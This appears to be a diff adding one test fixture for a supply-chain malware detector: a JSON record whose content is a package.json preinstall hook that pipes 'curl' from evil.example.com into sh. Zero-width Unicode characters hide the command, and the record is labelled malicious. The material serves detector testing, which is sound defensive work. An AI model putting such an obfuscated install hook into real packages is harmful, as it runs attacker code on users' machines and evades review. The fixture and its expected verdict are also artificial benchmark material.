@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::67::unicode-variations::3",
+  "base_sample_id": "exp::supply-chain-detector::67",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": 2042643801,
+  "content": "{\"scri⁠pts\"‌: {\"﻿p⁠r‍eins‌tall\": \"curl⁠ -s https://evil.ex​ample.co﻿m‍/‍payl​oa‌d.​sh ‍|⁠ sh\"}﻿}\n",
+  "content_hash": "5044aa0d8ee2ed04e901837d2dd9ce9259ff63b4374ea8cdeea709a6c6475e71",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:zero-width",
+  "difficulty": "advanced"
+}
